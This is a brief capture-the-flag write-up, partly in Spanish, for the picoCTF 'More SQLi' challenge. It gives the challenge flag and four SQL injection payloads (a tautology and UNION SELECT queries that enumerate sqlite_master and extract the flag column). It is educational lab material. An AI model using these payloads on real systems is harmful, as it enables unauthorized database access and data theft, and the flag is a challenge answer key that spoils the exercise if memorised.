# More SQLi

# Descripción

Can you find the flag on this website. Try to find the flag here.
# Solución

```  
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
```

```  
' or 1 == 1;

' union select sqlite_version(), 2,3;

Algiers' union select sqlite,2,3 from sqlite_master;

hola'union select id,flag,3 from more_table;

```

# Notas adicionales

Dependiendo de la versión de sql, cambia el método de inyección 

Burp Suite sigue siendo de mucha utilidad
# Referencias

